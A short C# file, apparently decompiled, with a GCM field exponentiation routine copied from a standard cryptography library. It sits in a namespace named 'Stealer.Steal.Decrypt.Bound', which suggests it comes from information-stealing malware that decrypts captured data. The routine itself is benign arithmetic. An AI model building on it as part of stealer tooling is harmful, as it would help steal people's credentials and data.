namespace Stealer.Steal.Decrypt.Bound;

public class BasicGcmExponentiator : IGcmExponentiator
{
	private ulong[] x;

	public void Init(byte[] x)
	{
		this.x = GcmUtilities.AsUlongs(x);
	}

	public void ExponentiateX(long pow, byte[] output)
	{
		ulong[] array = GcmUtilities.OneAsUlongs();
		if (pow > 0)
		{
			ulong[] array2 = Arrays.Clone(x);
			do
			{
				if ((pow & 1) != 0L)
				{
					GcmUtilities.Multiply(array, array2);
				}
				GcmUtilities.Square(array2, array2);
				pow >>= 1;
			}
			while (pow > 0);
		}
		GcmUtilities.AsBytes(array, output);
	}
}
